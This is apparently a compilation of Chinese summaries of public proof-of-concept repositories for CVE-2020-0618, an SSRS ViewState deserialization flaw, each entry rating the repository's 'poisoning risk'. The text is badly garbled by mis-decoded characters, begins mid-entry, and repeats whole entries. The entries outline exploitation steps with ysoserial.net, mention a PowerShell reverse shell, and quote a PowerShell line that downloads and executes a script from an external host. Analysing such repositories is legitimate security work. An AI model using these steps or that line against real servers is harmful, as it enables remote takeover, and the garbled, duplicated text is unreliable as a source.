**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

